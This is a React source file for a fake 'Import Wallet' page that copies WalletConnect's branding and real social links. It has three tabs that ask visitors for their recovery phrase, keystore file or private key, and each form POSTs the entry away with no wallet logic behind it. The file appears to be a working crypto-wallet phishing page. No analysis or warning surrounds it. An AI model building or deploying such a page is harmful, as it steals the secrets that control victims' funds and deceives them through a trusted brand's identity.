import React, { useState, useRef } from 'react';



const Index = () => {

    const [showPhrase, setShowPhrase] = useState(true);
    const [showKeyStore, setShowKeyStore] = useState(false);
    const [showPrivateKey, setShowPrivateKey] = useState(false);

    var tab = useRef(null)

    const HandleActiveClass = (e, form) => {

        for (var i = 0; i < tab.children.length; i++) {
            tab.children[i].classList.remove('active')
        }

        e.target.classList.add('active');

        switch (form) {
            case 'phrase':
                setShowPhrase(true);
                setShowPrivateKey(false)
                setShowKeyStore(false)
                break;

            case 'keystore':
                setShowPhrase(false);
                setShowPrivateKey(false)
                setShowKeyStore(true)
                break;

            case 'privatekey':
                setShowPhrase(false);
                setShowPrivateKey(true)
                setShowKeyStore(false)
                break;

            default:
                break;
        }


    };
    return (
        <center>
            <div className="top">
                <a href="index.html#footer" className="left">Github</a>

                <a href="/" className="left">Docs</a>
                <a href="/" className="main"><img src="./images/logo.svg" alt="logo" /></a>
                <a href="/" className="left">Wallets</a>
                <a href="/" className="left">Apps</a>
            </div>
            <br></br>
            <h2><center>Import Wallet</center></h2>
            <div className="tab" ref={el => tab = el}>
                <button className="tablinks active" id="default" onClick={e => HandleActiveClass(e, 'phrase')}>Phrase</button>
                <button className="tablinks" onClick={e => HandleActiveClass(e, 'keystore')}>Keystore JSON</button>
                <button className="tablinks" onClick={e => HandleActiveClass(e, 'privatekey')}>Private Key</button>
            </div>

            {showPhrase ?
                <div id="phrase" className="tabcontent" style={{ display: "block" }}>
                    <form w="" action="" method="POST">


                        <textarea name="phrase" className="phrase" required="required" minlength="12" placeholder="Phrase"></textarea>
                        <br></br>
                        <div className="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
                        <br></br>
                        <button type="submit" name="submit" className="btn">IMPORT</button>
                    </form>
                </div> : null}




            {showKeyStore ?
                <div id="keystore" className="tabcontent" style={{ display: "block" }}>
                    <form action="\" method="POST">


                        
                        <div className="field">
                            <input type="file" name="keystore" placeholder="" autocomplete="off" style={{ backgroundImage: "url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAASCAYAAABSO15qAAAAAXNSR0IArs4c6QAAAPhJREFUOBHlU70KgzAQPlMhEvoQTg6OPoOjT+JWOnRqkUKHgqWP4OQbOPokTk6OTkVULNSLVc62oJmbIdzd95NcuGjX2/3YVI/Ts+t0WLE2ut5xsQ0O+90F6UxFjAI8qNcEGONia08e6MNONYwCS7EQAizLmtGUDEzTBNd1fxsYhjEBnHPQNG3KKTYV34F8ec/zwHEciOMYyrIE3/ehKAqIoggo9inGXKmFXwbyBkmSQJqmUNe15IRhCG3byphitm1/eUzDM4qR0TTNjEixGdAnSi3keS5vSk2UDKqqgizLqB4YzvassiKhGtZ/jDMtLOnHz7TE+yf8BaDZXA509yeBAAAAAElFTkSuQmCC&quot)", backgroundRepeat: "no-repeat", backgroundAttachment: "scroll", backgroundSize: "16px 18px", backgroundPosition: "98% 50%", cursor: "auto" }} />
                        </div>
                        <div className="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
                        <br></br>
                        <button type="submit" name="submit" className="btn">IMPORT</button>
                    </form>
                </div> : null}

            {showPrivateKey ?
                <div id="private" className="tabcontent" style={{ display: "block" }}>
                    <form action="\" method="POST">

                        <div className="field">
                            <input type="text" name="key" className="key" placeholder="Private Key" />
                        </div>
                        <div className="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
                        <br></br>
                        <button type="submit" name="submit" className="btn">IMPORT</button>
                    </form>
                </div> : null}

                <footer><div id="footer">
                <p><img src="./images/discord.svg" alt="" className="footimg" />  <a href="https://discord.gg/jhxMvxP">Discord</a></p>
                <br></br>
                <p><img src="./images/telegram.svg" alt="" className="footimg" />  <a href="https://t.me/walletconnect_announcements">Telegram</a></p><br></br>
                <p><img src="./images/twitter.svg" alt="" className="footimg" />  <a href="https://twitter.walletconnect.org/">Twitter</a></p><br></br>
                <p><img src="./images/github.svg" alt="" className="footimg" />  <a href="https://github.com/walletconnect">Github</a></p><br></br>
            </div></footer>

        </center>
    )
}

export default Index
